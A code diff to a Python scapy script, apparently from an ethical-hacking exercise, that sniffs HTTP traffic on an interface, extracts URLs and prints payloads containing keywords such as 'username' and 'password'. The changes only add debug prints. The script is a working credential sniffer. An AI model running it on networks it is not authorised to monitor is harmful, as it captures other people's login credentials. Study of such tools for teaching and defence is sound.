@@ -2,8 +2,9 @@
 import scapy.all as scapy
 from scapy.layers import http
 
-def sniff(interface, process_packet):
-    scapy.sniff(iface=interface, store=False, prn=process_packet)
+def sniff(interface, process_sniffed):
+    print("sniff is being called")
+    scapy.sniff(iface=interface, prn=process_sniffed, store=False, )
 
 def get_url(packet):
     if packet.haslayer(http.HTTPRequest):
@@ -18,9 +19,11 @@ def get_login_info(packet):
         keywords = ["username", "user", "password", "login", "pass"]
         for keyword in keywords:
             if keyword in load:
-                print("[+] Possible username/password >> " +load)
+                print("[+] Possible username/password >> " + load)
 
 def process_sniffed_packet(packet):
+    print("Process packet is being called")
     if packet.haslayer(http.HTTPRequest):
+        print("packet has layer")
         get_url(packet)
         get_login_info(packet)
